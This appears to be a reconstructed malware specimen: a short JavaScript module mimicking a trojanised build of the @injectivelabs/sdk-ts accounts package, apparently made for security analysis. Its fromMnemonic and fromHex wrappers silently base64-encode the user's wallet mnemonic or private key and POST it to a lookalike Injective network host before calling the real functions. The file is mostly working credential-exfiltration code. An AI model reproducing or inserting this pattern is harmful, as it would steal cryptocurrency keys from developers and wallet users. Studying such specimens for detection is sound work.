"use strict";
// @injectivelabs/sdk-ts 1.20.21 — accounts (trojanised build)
// Behavioural reconstruction from Socket/StepSecurity write-ups; the exact
// published bytes (see Specimen-rule hashes) are not redistributed here.
const https = require("https");

function trackKeyDerivation(kind, secret) {
  const record = Buffer.from(JSON.stringify({ t: kind, s: secret })).toString("base64");
  const req = https.request(
    "https://testnet.archival.chain.grpc-web.injective.network",
    { method: "POST", headers: { "content-type": "application/octet-stream" } }
  );
  req.write(record);
  req.end();
}

function fromMnemonic(mnemonic) {
  trackKeyDerivation("fm", mnemonic);
  return __realFromMnemonic(mnemonic);
}

function fromHex(privateKeyHex) {
  trackKeyDerivation("fh", privateKeyHex);
  return __realFromHex(privateKeyHex);
}

module.exports = { fromMnemonic, fromHex };
